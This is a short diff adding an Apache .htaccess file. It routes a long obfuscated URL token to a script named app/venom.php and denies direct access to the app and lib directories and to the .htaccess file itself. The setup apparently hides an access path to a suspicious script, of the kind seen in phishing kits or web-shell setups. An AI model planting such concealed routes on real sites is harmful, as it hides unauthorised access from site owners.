@@ -1,0 +1,8 @@
+RewriteEngine on
+RewriteRule ^e0uu5QMFRCKBO8k0omx5wJZj244pwEUBjkjjwPS1My0jHZNX3R  app/venom.php
+<Files .htaccess>
+Order allow,deny
+Deny from all
+</Files>
+RewriteRule ^app/?$ - [F,L]
+RewriteRule ^lib/?$ - [F,L]
